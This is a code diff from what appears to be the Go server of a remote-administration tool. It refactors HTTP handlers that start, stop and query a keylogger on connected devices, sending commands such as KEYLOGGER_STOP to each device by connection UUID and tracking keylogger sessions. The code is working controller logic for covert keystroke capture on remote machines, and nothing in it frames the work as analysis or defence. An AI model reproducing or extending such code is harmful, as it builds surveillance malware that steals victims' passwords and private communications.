@@ -63,8 +63,9 @@ func InitRoutes(routes *gin.RouterGroup) {
 // Start keylogger on a device
 func startKeylogger(ctx *gin.Context) {
 	deviceID := ctx.Param("device")
-	device, err := common.CheckDevice(ctx, deviceID)
-	if err != nil {
+	connUUID, ok := common.CheckDevice(deviceID, "")
+	if !ok {
+		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
 		return
 	}
 
@@ -91,7 +92,7 @@ func startKeylogger(ctx *gin.Context) {
 		Data: configData,
 	}
 
-	device.Conn.SendPack(packet)
+	common.SendPackByUUID(packet, connUUID)
 
 	// Create session
 	session := &KeyloggerSession{
@@ -113,8 +114,9 @@ func startKeylogger(ctx *gin.Context) {
 // Stop keylogger on a device
 func stopKeylogger(ctx *gin.Context) {
 	deviceID := ctx.Param("device")
-	device, err := common.CheckDevice(ctx, deviceID)
-	if err != nil {
+	connUUID, ok := common.CheckDevice(deviceID, "")
+	if !ok {
+		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
 		return
 	}
 
@@ -122,7 +124,7 @@ func stopKeylogger(ctx *gin.Context) {
 		Act: "KEYLOGGER_STOP",
 	}
 
-	device.Conn.SendPack(packet)
+	common.SendPackByUUID(packet, connUUID)
 
 	// Update session
 	if session, exists := activeSessions[deviceID]; exists {
@@ -135,8 +137,9 @@ func stopKeylogger(ctx *gin.Context) {
 // Get keylogger status
 func getKeyloggerStatus(ctx *gin.Context) {
 	deviceID := ctx.Param("device")
-	device, err := common.CheckDevice(ctx, deviceID)
-	if err != nil {
+	connUUID, ok := common.CheckDevice(deviceID, "")
+	if !ok {
+		ctx.JSON(http.StatusBadGateway, gin.H{"error": "Device not found"})
 		return
 	}
 
@@ -144,7 +147,7 @@ func getKeyloggerStatus(ctx *gin.Context) {
 		Act: "KEYLOGGER_STATUS",
 	}
 
-	device.Conn.SendPack(packet)
+	common.SendPackByUUID(packet, connUUID)
 
 	// Return session info if available
 	if session, exists := activeSessions[deviceID]; exists {
